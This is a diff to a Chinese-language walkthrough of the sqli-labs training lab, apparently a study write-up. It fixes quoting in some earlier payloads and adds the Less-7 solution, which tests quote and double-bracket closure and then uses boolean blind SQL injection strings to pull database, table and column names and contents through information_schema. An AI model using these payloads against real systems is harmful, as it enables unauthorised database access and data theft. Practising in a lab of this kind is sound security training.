@@ -1035,7 +1035,7 @@ http://localhost/sqli-labs/Less-2/
 + 再逐步爆破联合字段名长度
 
 ~~~ shell
-?id=1"and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）')>20--+
+?id=1" and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）')>20--+
 ~~~
 
 
@@ -1043,7 +1043,7 @@ http://localhost/sqli-labs/Less-2/
 + 逐步爆破联合字段名
 
 ~~~ shell
-?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）'),1,1))>99--+
+?id=1" and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）'),1,1))>99--+
 ~~~
 
 
@@ -1051,10 +1051,151 @@ http://localhost/sqli-labs/Less-2/
 + 最后检测想要的内容
 
 ~~~ shell
-?id=1' and ascii(substr((select group_concat(（字段名）,（字段名）) from （数据表名）),1,1))>50--+
+?id=1" and ascii(substr((select group_concat(（字段名）,（字段名）) from （数据表名）),1,1))>50--+
 ~~~
 
 
 
 ### Less-7
+
++ 注入以下语句
+
+~~~ shell
+?id=1
+~~~
+
+![Less-7_1](./img/Less-7_1.PNG)
+
+输入<code>id=1</code>,页面显示<code>you are in...</code> ，页面回显正确
+
+
+
++ 注入以下语句(单引号)
+
+~~~ shell
+?id=1'
+~~~
+
+![Less-7_2](./img/Less-7_2.PNG)
+
+当输入<code>id=1'</code>时显示报错但没有报错信息，这和之前的关卡不一样，之前都有报错信息
+
+
+
++ 注入以下语句(双引号)
+
+~~~ shell
+?id=1"
+~~~
+
+![Less-7_3](./img/Less-7_3.PNG)
+
+当输入<code>id=1"</code>时显示正常所以可断定参数<code>id</code>是单引号字符串，因为单引号破坏了原有语法结构
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1'--+
+~~~
+
+![Less-7_4](./img/Less-7_4.PNG)
+
+输入<code>id=1'--+</code>时报错
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1')--+
+~~~
+
+![Less-7_5](./img/Less-7_5.PNG)
+
+输入id=1')--+发现依然报错
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1'))--+
+~~~
+
+![Less-7_6](./img/Less-7_6.PNG)
+
+再试试是不是双括号注入<code>id=1'))--+</code>，发现页面显示正常。那么它的过关手法和前面就一样了选布尔盲注就可
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1')) and length((select database()))>7--+
+~~~
+
+![Less-7_7](./img/Less-7_7.PNG)
+
+页面显示正常，通过修改数据库长度值再根据页面显示是否正常确定数据库长度值
+
+
+
++ 注入以下语句
+
+~~~ shell
+?id=1')) and ascii(substr((select database()),1,1))=115--+
+~~~
+
+![Less-7_8](./img/Less-7_8.png)
+
+修改参数根据页面是否回显正确逐一爆破数据库名
+
+
+
++ 再修改参数同时注入以下语句确定联合数据表名长度
+
+~~~ shell
+?id=1')) and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>5 --+
+~~~
+
+![Less-7_9](./img/Less-7_9.PNG)
+
+
+
++ 修改参数注入以下语句爆破联合数据表名
+
+~~~ shell
+?id=1')) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>50--+
+~~~
+
+![Less-7_10](./img/Less-7_10.PNG)
+
+
+
++ 修改参数注入以下语句爆破联合字段名长度
+
+~~~ shell
+?id=1')) and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）')>20--+
+~~~
+
+
+
++ 修改参数注入以下语句爆破字段名
+
+~~~ shell
+?id=1')) and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='（之前爆破的数据表名）'),1,1))>99--+
+~~~
+
+
+
++ 修改参数爆破想要的内容
+
+~~~ shell
+?id=1')) and ascii(substr((select group_concat(（字段名）,（字段名）) from （数据表名）),1,1))>50--+
+~~~
+
+
+
+### Less-8
 
